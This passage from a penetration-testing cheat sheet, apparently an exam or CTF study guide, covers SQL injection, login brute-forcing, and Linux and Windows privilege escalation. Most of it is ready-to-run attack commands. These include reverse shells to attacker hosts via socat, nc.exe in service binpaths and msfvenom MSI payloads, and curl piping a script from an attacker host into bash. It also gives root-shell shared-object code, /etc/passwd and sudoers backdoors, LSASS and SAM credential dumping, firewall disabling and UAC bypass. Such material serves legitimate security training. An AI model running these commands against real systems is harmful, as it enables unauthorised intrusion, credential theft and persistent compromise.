  • Check for SSRF if any browser-like features exist:
    • Capture NTLM hashes via Responder — point SSRF at //[your-ip]/share for offline cracking

22.2.10 Parameter Testing and SQL Injection

Test one parameter at a time; confirm injection before running sqlmap to avoid WAF lockouts.

  • Play with POST and GET — switching methods can bypass filters or expose hidden params:
    • Google every response, parameter name, and path
    • Guess POST parameters from output — see the Werkzeug walkthrough
  • Tamper with weak cookies — Base64-encoded cookies are not encrypted; JWT with alg: none or weak HMAC are tamper-able
  • Test every parameter for SQL injection — start with ', identify DB type from error, then tailor syntax:
    • Enable shells: xp_cmdshell for MSSQL (requires sysadmin + sp_configure); INTO OUTFILE for MySQL (requires FILE privilege + known web root)
    • If shells are not feasible, extract credentials with sqlmap (--dbs --tables --dump)

22.2.11 Authentication and Login Forms

Exhaust lower-effort options first — defaults, context guesses, previously found creds — before brute-forcing.

  • Default credentials — Google or use creds tool:
pip3 install defaultcreds-cheat-sheet
creds search [product]
  • cewl for user and password lists:
cewl -d 3 -m 6 http://[ip] -w cewl.txt
  • Common credential combinations:
    • version:version
    • boxname:boxname
    • admin:version
    • name:version
    • PHP type juggling — "0e12345" == "0e67890" evaluates true under loose comparison
  • Check config files, other services, and previous loot — maintain a running creds.txt
  • Brute-force if necessary — verify no lockout first (send two deliberate wrong logins):
# Hydra HTTP POST form
hydra -L users.txt -P cewl.txt [ip] http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"

22.3 Privilege Escalation

Find something running with higher privileges and abuse its configuration, replace what it executes, steal its credentials, or hijack a library it loads.

22.3.1 Linux

Recommended Order of Operations — Linux

  1. Stabilise your shell first — upgrade to a full PTY so sudo, su, and editors work.
  2. Container / scope check — confirm you are on the real host before spending time on host-level privesc techniques.
  3. Quick credential wins — try root:root, known passwords reused from foothold, and sudo -l immediately.
  4. Run LinPEAS — treat its red/yellow findings as an ordered to-do list before any manual enumeration.
  5. Chase automation leads — PwnKit, exploitable sudo rules, SUID binaries (GTFOBins), writable cronjob scripts.
  6. Monitor live processes with pspy — run for at least 2–5 minutes to catch transient root cronjobs.
  7. Credential harvest — history files, config files, local databases, memory, SSH keys.
  8. Deep service / library / PATH abuse — UDF, LD_LIBRARY_PATH, Python path hijacking.
  9. Kernel exploits last — noisy, may crash the machine, and often unnecessary.

Linux Privesc — What to Check → Why (Quick-Reference Table)

What to Check Key Command / Tool Why It Matters / Precondition Confirms Exploitation When…
Shell quality / TTY python3 -c 'import pty;pty.spawn("/bin/bash")' or socat Many privesc techniques silently fail in a non-interactive shell; required before anything else echo $TERM returns xterm and stty -a shows correct rows/cols
Container check ls /.dockerenv; cat /proc/1/cgroup Changes the entire escalation path; host-level techniques are irrelevant inside a container No /.dockerenv, cgroup shows real host processes
Sudo rules sudo -l; SUDO Killer NOPASSWD entries or wildcard rules often give instant root via GTFOBins one-liner Any (root) NOPASSWD: entry for a GTFOBins-listed binary
PwnKit (CVE-2021-4034) ls -la /usr/bin/pkexec; PoC from GitHub Affects virtually all Linux distros before ~Jan 2022; one of the most reliable lab wins pkexec exists, unpatched (check with LinPEAS yellow highlight)
SUID / SGID binaries find / -perm -4000 -type f 2>/dev/null Binaries run as their owner (often root); GTFOBins documents abuse for hundreds of standard ones Non-standard binary not in GTFOBins — read/reverse it; standard binary — apply GTFOBins recipe
Writable cronjob scripts pspy64; crontab -l; cat /etc/cron* Root-owned cronjobs calling writable scripts are the single most common lab privesc path Script is world-writable or owned by your user; append reverse shell payload
Writable service / unit files ls -la /etc/init.d/ /etc/systemd/system/ If you can modify a service script or ExecStart= and trigger a restart, you get root code execution Service file is writable and you can restart it (sudo or reboot)
Exploitable groups (lxd, docker, disk) id; groups lxd → privileged container + host mount = root read/write; disk → raw device access to root filesystem Group listed in id output matches an exploitable group
LD_LIBRARY_PATH / missing .so ldd <suid-binary>; strace -e open <binary> 2>&1 | grep "No such" If a SUID binary loads a library from a path you can write, drop a malicious .so there strace shows ENOENT on a path inside a writable directory
Python / Perl module hijack find / -name "*.py" -writable 2>/dev/null Root-owned Python scripts import modules; writable module = code runs as root on next import Module file is writable by your user and imported by a root-run script
MySQL UDF mysql -uroot -p; select @@plugin_dir; If MySQL runs as root and you can log in, load a shared object to execute OS commands as root MySQL runs as root (ps aux | grep mysql) and plugin dir is writable
Credentials in files / history grep -rnw / -ie "password"; cat ~/.bash_history Found credentials can unlock other accounts or enable sudo with the discovered password Any credential that works for su root or elevates sudo permissions
SSH keys find / -name id_rsa 2>/dev/null; cat ~/.ssh/authorized_keys Unprotected private keys give direct authentication without cracking Private key for root or a higher-privilege user found and readable
Kernel exploit Linux Exploit Suggester; uname -r Last resort — stable PoCs exist for many older kernels (Dirty COW, DirtyCred, etc.) LES rates the exploit as "highly probable" and the kernel version matches

Principles to Becoming Root

  1. Adding a new user.
  2. Make the user run commands without needing password sudo -l
  3. cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash

General Enumeration

  • Upgrade your shell using Socat, else Python
    • A fully interactive TTY lets you run su, sudo, and text editors without the shell dying.
    • Socat (preferred) — attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444; target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[attacker]:4444
    • Python fallback — python3 -c 'import pty;pty.spawn("/bin/bash")', then Ctrl+Z, stty raw -echo; fg, export TERM=xterm
  • Are we in a docker container? Check with ls /.dockerenv and cat /proc/1/cgroup
    • Escape routes — privileged container (--privileged flag → mount host disk), writable Docker socket at /var/run/docker.sock, mounted host paths.
  • Run SUDO Killer if we have full SSH creds
    • Manual equivalent: sudo -l, then cross-reference each allowed binary against GTFOBins under the "sudo" filter.
    • Dangerous patterns — (ALL) NOPASSWD: /usr/bin/vim, wildcards like /opt/*.sh, env_keep entries preserving LD_PRELOAD or PYTHONPATH.
  • Run SUI3Emum
  • Test the default credential to elevate privileges root:root
  • Run linpeas.sh
    • Host via python3 -m http.server 80 and fetch with curl http://[attacker]/linpeas.sh | bash. Red = easy win, yellow = interesting lead.
    • PwnKit? This is an easy win
      • CVE-2021-4034 — ls -la /usr/bin/pkexec; if it exists and the box predates February 2022, it is very likely vulnerable.
    • Enumerate Users
      • Look for other users
      • Try to switch users and rerun enumeration: test different words other than PASSWORD, e.g., pass, passwd, pwd, user, usr, username, secret, cred, credential, auth
    • Enumerate Groups
      • Are these exploitable?
      • lxd
        • Import a minimal Alpine image, create a privileged container with security.privileged=true mounting host / to /mnt/root, then exec in to read /mnt/root/etc/shadow or write to /mnt/root/etc/passwd.
      • davfs
      • sudo
      • fail2ban - Any accessible sensitive file?
        • Inject a reverse shell into /etc/fail2ban/action.d/ action file — it executes as root when a ban triggers; trigger bans by making deliberate failed SSH attempts.
      • Other high-value groups — docker (mount host filesystem), disk (raw debugfs access), adm (read system logs), shadow (read /etc/shadow for offline cracking).
  • Enumerate the file system for weird files we can overwrite
    • Check /opt and /srv
    • find / -name "*.py" — writable modules imported by root-owned scripts run as root.
      • List imports with grep -r "^import\|^from" script.py; check search order with python3 -c "import sys; print(sys.path)".
    • Check for weird folders and bash scripts we could modify
    • Python scripts
    • Even check Perl
    • World-writable files owned by root — find / -writable -user root -type f 2>/dev/null
    • PATH hijacking — if a SUID binary calls a command by name without absolute path: export PATH=/tmp:$PATH and place a malicious binary there.
  • Transfer Linux Exploit Suggester: try the most probable exploits
    • Kernel exploits can crash the target — confirm a working PoC in a lab first; prefer other vectors if available.
    • Key CVEs — Dirty COW (CVE-2016-5195), DirtyCred (CVE-2022-2588), Overlayfs (CVE-2023-0386), Baron Samedit (CVE-2021-3156).

Configuration Files & SUID

SUID binaries run as their owner (often root) regardless of who executes them.

  • /root/.ssh/id_rsa
  • Entire root folder
  • Check env info
(env || set) 2>/dev/null
echo $PATH
  • Look through SUID set
    • Refer to GTFOBins for each binary found
    • Can we write them?
    • Google everything
  • LOOK EVEN FOR CUSTOM ONES AND USE THEM!
    • Run strings <binary> first; look for system calls, hardcoded paths, or relative command names (PATH hijack candidate). Then use ltrace / strace to observe runtime behaviour.
    • Are these missing libraries?
      • Do we have write access to the LD_LIBRARY_PATH?
        • Generate our own .so file and paste it in the writable path
          • Minimal template: void __attribute__((constructor)) init() { setuid(0); system("/bin/bash"); } — compile with gcc -shared -fPIC -o libvuln.so exploit.c.

Services & Jobs

  • Enumerate processes that run as root — use PSPY
    • pspy monitors /proc without root; run for 2–5 minutes. UID=0 = root. Watch for recurring commands touching /tmp, /opt, or non-standard paths.
  • Enumerate internal running services
    • If there is a website, play with curl
      • ss -tlnp to list listeners; for each unexpected port, curl -s http://127.0.0.1:[port]/ for admin panels or APIs.
    • Are these running as other users we can become?
    • If there is a database running, enumerate for credentials to test for UDF: mysql -uroot -p[pass]
      • MySQL UDF — compile lib_mysqludf_sys.so, upload to plugin dir (SELECT @@plugin_dir), create the function, then call SELECT sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
    • Remote port forward if we have SSH access, or use chisel or ligolo
      • SSH: ssh -L 3306:127.0.0.1:3306 [user]@[target]. Chisel: server chisel server --reverse -p 8000; client ./chisel client [attacker]:8000 R:3306:127.0.0.1:3306.
  • Init, init.d, systemd Services?
    • Can we overwrite them?
    • Can we start or stop the service?
    • Can we reboot the machine?
      • Systemd unit abuse — change ExecStart= to a reverse shell, then systemctl daemon-reload && systemctl restart <service>.
  • Check for Cronjobs
    • Check: /etc/crontab, /etc/cron.d/*, /var/spool/cron/crontabs/root, /etc/cron.hourly|daily|weekly|monthly/. Pspy catches jobs not visible in any of these.
    • Can we overwrite them?
    • Can we edit them to add malicious code like a reverse shell or elevate the current shell?
    • Are these missing a library when running?
    • Can we overwrite the library path?
    • GOOGLE EVERYTHING HERE — some custom scripts have vulnerable expressions
      • Wildcard injection — if root runs tar cf backup.tar * in a writable dir, create files named --checkpoint=1 and --checkpoint-action=exec=sh payload.sh.

Credentials Search

  • Password Files
    • /etc/passwd
      • If writable, append: hacker:$(openssl passwd -1 'password'):0:0::/root:/bin/bash
    • /etc/shadow
      • unshadow /etc/passwd /etc/shadow > hashes.txt, then john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    • /etc/sudoers
      • If writable, append [user] ALL=(ALL) NOPASSWD:ALL and run sudo bash.
  • Try known passwords
  • Search creds from config files: try pass, passwd, pwd, user, usr, username, secret, cred, credential, auth
# Search config files for credentials
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
locate password | more
# Shell history
history
cat ~/.bash_history
# Search memory for passwords
strings /dev/mem -n10 | grep -i PASS
# SSH keys
cat ~/.ssh/id_rsa
ls ~/.ssh/*
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
# rsync config
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
  • Search for creds in services using strings
    • strings /path/to/binary | grep -i pass — also grep for token, key, secret, api, Authorization.
  • Search creds from local DBs
  • Search creds from bash history
    • Also check ~/.zsh_history, ~/.fish_history, /root/.bash_history, /home/*/.bash_history.
  • Search creds from memory
  • SSH Keys
    • Also check authorized_keys and known_hosts (pivot targets).
  • Search rsync config file
    • rsyncd.secrets stores plaintext credentials and is sometimes world-readable.

22.3.2 Windows

Windows escalation flows through one of four channels: token/privilege abuse (SeImpersonate → Potato), service misconfiguration (writable binary, unquoted path, weak ACL), credential harvest (registry, files, memory), or kernel/software exploit.

Recommended Order of Operations — Windows

  1. Check whoami /all immediately — SeImpersonatePrivilege on a service account is an almost-guaranteed SYSTEM path via a Potato exploit.
  2. Run WinPEAS and PowerUp — review all red findings before manual enumeration.
  3. Try known credentials — password reuse is extremely common.
  4. Service misconfiguration — unquoted paths, writable binaries, weak service ACLs.
  5. Scheduled tasks — non-Microsoft tasks with writable executable or dependency paths.
  6. Credential harvest — registry, Credential Manager, browser, PowerShell history, unattend files, SAM/SYSTEM backups.
  7. AlwaysInstallElevated — quick two-key registry check; instant SYSTEM if both are set.
  8. Kernel / software exploit — use Sherlock/Watson; last resort due to stability risk.

Windows Privesc — What to Check → Why (Quick-Reference Table)

What to Check Key Command / Tool Why It Matters / Precondition Confirms Exploitation When…
SeImpersonatePrivilege whoami /priv; PrintSpoofer, GodPotato, RoguePotato Service accounts (IIS, MSSQL, MySQL) commonly hold this; enables impersonating SYSTEM token Privilege listed as Enabled; PrintSpoofer returns NT AUTHORITY\SYSTEM shell
SeBackupPrivilege whoami /priv; robocopy with /B, or diskshadow + secretsdump.py Allows reading any file bypassing ACLs; use to copy SAM + SYSTEM hives for offline NTLM extraction Can read C:\Windows\System32\config\SAM without admin rights
SeDebugPrivilege whoami /priv; mimikatz sekurlsa::logonpasswords Allows opening any process handle including LSASS; dump plaintext credentials from memory mimikatz retrieves cleartext passwords or NTLM hashes from LSASS
Unquoted Service Path wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" Windows resolves unquoted paths with spaces left-to-right; place a binary at an earlier resolution point Path contains spaces, is unquoted, and you can write to an intermediate directory
Weak Service ACL accesschk.exe -uwcqv "Authenticated Users" * SERVICE_CHANGE_CONFIG lets you redirect binpath= to your malicious binary accesschk shows SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG for a non-admin principal
Writable Service Binary icacls "C:\path\to\service.exe" Overwrite the binary with your payload; on next service start SYSTEM executes your code icacls shows (F) or (M) for your user or Everyone
DLL Hijacking Process Monitor (filter: NAME NOT FOUND + .dll); Procmon logs Application searches for DLL in a user-writable directory before the real location; drop malicious DLL there Procmon shows DLL loaded from your writable path after placing the malicious file
AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated Both HKLM and HKCU must be 1; any .msi then runs as SYSTEM regardless of user privilege Both registry values return 0x1; malicious MSI spawns SYSTEM shell
Scheduled Task with writable binary schtasks /query /fo LIST /v Non-Microsoft tasks running as SYSTEM with writable executable = code execution as SYSTEM Task runs as SYSTEM and executable is writable by your user
Windows Autologin / registry creds reg query "HKLM\...\Winlogon" Administrators sometimes configure autologin and leave plaintext passwords in the registry DefaultPassword value is set and non-empty
SAM + SYSTEM hive (offline) reg save HKLM\SAM sam.hiv; secretsdump.py -sam sam.hiv -system sys.hiv LOCAL SAM holds NTLM hashes for all local accounts; combined with SYSTEM (boot key), full hash extraction is possible secretsdump outputs NTLM hashes; crack offline or use pass-the-hash
GPP / SYSVOL passwords findstr /S /I cpassword \\DOMAIN\SYSVOL\*.xml; gpp-decrypt Group Policy Preferences XML files encrypt passwords with a publicly known AES key; trivially decrypted Any cpassword attribute found; gpp-decrypt returns plaintext immediately
Unattend / Sysprep files dir /s /b unattend.xml sysprep.xml Generated during OS deployment; frequently left on disk with Administrator password in plaintext or base64 File found and contains <Password> or <PlainText> XML element
Credential Manager / Windows Vault cmdkey /list; runas /savecred Saved RDP and network credentials can be replayed without knowing the password cmdkey /list shows saved credentials for an admin or domain account
Kernel / missing patch Sherlock, Watson; wmic qfe cross-referenced with exploit DB Unpatched Windows kernels have well-known local privilege escalation exploits Sherlock identifies a missing hotfix with a reliable public PoC

General User Enumeration

  • Enumerate current user and its permissions
whoami /all
net users %username%
net users
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
net localgroup
net localgroup Administrators
  • General Groups Enumeration
  • Check if the current user has these tokens
    • Token abuse — SeImpersonatePrivilege: try Potato attacks first (PrintSpoofer on 2019+, RoguePotato on 2016/2012, JuicyPotato on older). SeBackupPrivilege: dump SAM hive. SeDebugPrivilege: run mimikatz against LSASS.
    • SeImpersonatePrivilege
      • Windows Server 2019 / Windows 10 1809+: PrintSpoofer or GodPotato; 2016/2012R2: RoguePotato or JuicyPotato (check CLSID list).
    • SeAssignPrimaryPrivilege
    • SeTcbPrivilege
    • SeBackupPrivilege
      • Use robocopy /B C:\Windows\System32\config\SAM . or diskshadow, then secretsdump.py -sam SAM -system SYSTEM LOCAL.
    • SeRestorePrivilege
    • SeCreateTokenPrivilege
    • SeLoadDriverPrivilege
      • Allows loading a kernel driver; a malicious signed driver can execute kernel-level code. On hardened systems may require a vulnerable legitimate driver already installed (BYOVD).
    • SeTakeOwnershipPrivilege
      • Take ownership of any object regardless of its ACL, then modify permissions to read or write it. Useful for protected config files or registry keys containing credentials.
    • SeDebugPrivilege
      • procdump.exe -accepteula -ma lsass.exe lsass.dmp, then parse offline: sekurlsa::minidump lsass.dmp / sekurlsa::logonpasswords.
  • Use Enumeration Scripts
    • WinPEAS: broad and colour-coded. PowerUp: focuses on service/registry misconfigs. Seatbelt: system health audit. Sherlock/Watson: patch gap identification. SharpHound: AD enumeration for BloodHound.
    • WinPeas
    • PowerUp
    • Seatbelt
    • Sherlock
    • Rubeus
    • SharpHound

System Enumeration

  • Windows version
  • Software Versions
  • Service Versions
  • Installed patches and updates
    • Cross-reference wmic qfe against Sherlock/Watson. Key absences — MS16-032, MS15-051, MS14-058.
  • Architecture
  • Environment variables
  • Drives
  • Kernel version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
# Cross-compile from Kali — windows-kernel-exploits: https://github.com/SecWiki/windows-kernel-exploits
i586-mingw32msvc-gcc -o adduser.exe useradd.c

Network Enumeration

Are the running services running as other users? Can we modify the website by pasting a PHP file that runs as the user who hosts the website?

  • Services running on localhost
    • Use netstat -ano to find localhost-bound services, then forward with plink.exe -l root -pw [pass] -R 445:127.0.0.1:445 [attacker] or chisel.
  • List all NICs, IP and DNS
  • List routing table
  • List ARP table
    • ARP cache reveals other recently contacted hosts — useful for pivoting.
  • List current connections
  • List current connections correlated to running service (requires elevated privs)
  • List firewall state and config
  • List firewall's blocked ports
  • Disable firewall
  • List network shares
  • SNMP config
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
netstat -ano
netstat -bona
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
net share
powershell Find-DomainShare -ComputerDomain domain.local
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

Misconfigurations

Service misconfigurations are the most common Windows privesc path in CTF and exam environments: can you control what the service runs, and can you trigger a restart?

  • Services
  • Can we restart the machine?
  • Can we start and stop the service?
    • Check permissions
    • Unquoted Service Path
      • For C:\Program Files\My App\svc.exe, Windows tries: C:\Program.exe, C:\Program Files\My.exe, then the full path. Place your binary at the first location where you have write access.
    • Change service binary path
      • If the service ACL grants SERVICE_CHANGE_CONFIG, use sc config to point the binary path at your executable.
    • DLL Hijacking / Overwrite service binary
      • DLL search order (Safe DLL Search Mode off): (1) .exe directory, (2) system directory, (3) 16-bit system directory, (4) Windows directory, (5) current directory, (6) PATH. Target the application's own install directory first.
      • DLL proxy technique — forward all exports to the real DLL to avoid crashing the service.
    • Registry modify permissions
      • If you can write the ImagePath registry value for a service, you control what binary runs on next start.
sc qc <service_name>
accesschk.exe -ucqv <Service_Name>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
# Unquoted service path
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
# Change service binary path
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe [attacker-ip] 4444 -e cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators [username] /add"
wmic service [service_name] call startservice
net stop [service_name] && net start [service_name]
# DLL Hijacking — find writable service binaries
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\\"
# Registry modify permissions
reg query hklm\System\CurrentControlSet\Services /s /v imagepath
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
  • Installed Applications
    • DLL Hijacking for installed applications
      • Run the target application under Process Monitor filtered to NAME NOT FOUND + .dll, then look for DLLs loaded from writable application directories. WinPEAS also highlights candidates.
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
  • Write permissions
accesschk.exe /accepteula
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
# PATH DLL Hijacking — check write permissions in PATH folders
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\ everyone authenticated users todos %username%" && echo. )
  • AlwaysInstallElevated set in Registry
    • Both HKLM and HKCU must be set to 1; generate a malicious MSI: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker] LPORT=4444 -f msi -o evil.msi, then run msiexec /quiet /qn /i evil.msi.
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
msiexec /quiet /qn /i C:\Users\[user]\Downloads\alwe.msi
  • Scheduled Tasks
    • Filter out \Microsoft\ path tasks; focus on custom tasks. Check run-as account (SYSTEM?) and that the trigger is recurring.
    • Executable file writeable
    • Dependency writeable
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /v "\Microsoft"
Get-ScheduledTask | ft TaskName,TaskPath,State
Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
  • Sensitive Files Readable:
    • SAM Hive
      • reg save HKLM\SAM C:\Temp\sam.hiv and reg save HKLM\SYSTEM C:\Temp\sys.hiv, then impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL.
    • SYSTEM Hive
  • Windows Subsystem For Linux: navigate to the filesystem and look for suspicious scripts; replace them if possible.
    • If WSL runs as root by default, any Windows user who can launch it gets a Linux root shell that can read Windows files from /mnt/c/.
wsl whoami
./ubuntum2004.exe config --default-user root
wsl whoami
wsl python -c 'put here your command'

Credential Access

  • Go from Medium mandatory level to High mandatory level
    • UAC bypass — fodhelper.exe registry hijack via HKCU\Software\Classes\ms-settings\shell\open\command, eventvwr.exe hijack, or Invoke-EventViewer (PowerUp). Works when UAC level is below "Always notify" (the default).
powershell.exe Start-Process cmd.exe -Verb runAs
  • TRY KNOWN PASSWORDS!
    • Every found credential should be tested against every local account, domain account, and service login. Quick test: crackmapexec smb [target] -u Administrator -p "[pass]".
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc [attacker-ip] 4444 -e cmd.exe"
  • Find creds from config files (try: pass, passwd, pwd, user, usr, username, secret, cred, credential, auth)
dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
findstr /si /m password *.xml *.ini *.txt
  • Creds from local DBs
  • Creds from Windows Vault
    • cmdkey /list then replay with runas /savecred /user:[domain]\[admin] cmd.exe.
cmdkey /list
runas /savecred /user:WORKGROUP\Administrator "\\[attacker-ip]\SHARE\welcome.exe"
  • Creds from Registry
    • PuTTY, VNC, and Windows Autologin store credentials in the registry — often plaintext or weakly obfuscated. VNC passwords use a fixed DES key; use known decryption scripts or post/multi/gather/vnc_credentials.
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
# SNMP, PuTTY, VNC, OpenSSH
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
  • Creds from Unattend or Sysprep Files
    • Often left on disk after deployment with the Administrator password in plaintext or base64. Decode base64: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("[value]")).
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattend*.xml
%WINDIR%\Panther\Unattend*.xml
  • Creds from Log Files
    • IIS logs at C:\inetpub\logs\LogFiles\, MSI install logs in %TEMP%\*.log, MSSQL error logs may contain connection strings with embedded credentials.
dir /s /b /p *access*.log* == *.log
  • Creds from IIS web config
    • web.config frequently contains database connection strings with plaintext credentials.
Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem -Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
  • Check other possible interesting files
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log

%WINDIR%\system32\config\SecEvent.Evt

C:\Program Files\Windows PowerShell\*vnc.ini, ultravnc.ini, \*vnc\*

php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
